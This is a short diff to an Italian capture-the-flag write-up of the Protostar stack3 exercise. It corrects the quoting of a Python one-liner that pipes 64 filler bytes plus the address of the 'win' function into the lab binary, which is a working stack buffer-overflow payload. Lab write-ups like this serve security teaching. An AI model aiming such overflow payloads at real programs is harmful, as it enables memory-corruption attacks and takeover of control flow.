@@ -19,7 +19,7 @@ $1 = {void(void)} 0x8048424 <win>
 ```
 ### Istruzioni da eseguire
 ```bash
-> 'python -c 'print "a" * 64 + "\x24\x84\x04\x08"'' | /opt/protostart/bin/stack3
+> python -c 'print "a" * 64 + "\x24\x84\x04\x08"' | /opt/protostart/bin/stack3
 # sfida vinta
 ```
 ## Debolezze
